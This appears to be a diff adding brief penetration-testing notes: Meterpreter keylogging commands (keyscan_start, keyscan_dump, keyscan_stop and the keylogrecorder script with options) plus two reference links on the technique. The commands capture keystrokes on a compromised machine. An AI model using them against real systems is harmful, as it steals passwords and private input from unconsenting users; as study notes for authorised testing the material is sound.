@@ -1,0 +1,14 @@
+- meterpreter > keyscan_start
+- meterpreter > keyscan_dump
+- meterpreter > keyscan_stop
+
+
+- run keylogrecorder -h
+- run keylogrecorder
+- run keylogrecorder -c 1
+
+
+
+
+http://www.darkoperator.com/blog/2009/3/23/keylogger-recorder-meterpreter-script.html
+https://www.offensive-security.com/metasploit-unleashed/screen-capture/
